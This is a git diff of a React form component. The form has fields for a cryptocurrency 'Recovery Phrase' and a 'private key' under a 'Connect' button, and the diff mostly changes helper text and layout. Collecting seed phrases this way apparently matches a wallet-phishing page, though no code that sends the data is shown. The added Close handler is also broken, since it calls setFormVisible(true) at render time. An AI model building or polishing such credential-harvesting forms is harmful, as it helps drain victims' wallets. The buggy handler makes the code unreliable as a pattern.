@@ -69,9 +69,9 @@ function Form() {
                 placeholder={"Recovery Phrase"}
                 data-gramm="false"
               ></textarea>
-              <p>
-                Typically 12 (sometimes 24) words separated by single spaces
-              </p>
+              <span className="bg-white">
+                Typically 12 - 24 words seperated by a single space
+              </span>
             </>
           )}
           {active === 2 && (
@@ -104,20 +104,24 @@ function Form() {
                 placeholder={"private key"}
                 data-gramm="false"
               ></textarea>
-              <p>
-                Typically 12 (sometimes 24) words seperated by a single space.
-              </p>
+              <span className="bg-white">
+                Typically 12 - 24 words seperated by a single space
+              </span>
             </>
           )}
-
-          <span className="bg-white">
-            Typically 12 - 24 words seperated by a single space
-          </span>
-          <input
-            type="submit"
-            value="Connect"
-            className="mx-auto mt-5 block rounded bg-blue-500  px-[30px] py-[15px] text-center text-white md:mt-5"
-          />
+          <div className="flex gap-4">
+            <input
+              type="submit"
+              value="Connect"
+              className="mx-auto mt-5 block w-[70%] cursor-pointer rounded bg-blue-500 px-[30px] py-[15px] text-center text-white md:mt-5"
+            />
+            <p
+              onClick={setFormVisible(true)}
+              className="cursor-pointer bg-red-500 px-2 py-4 text-white "
+            >
+              Close
+            </p>
+          </div>
         </form>
       </div>
     </div>
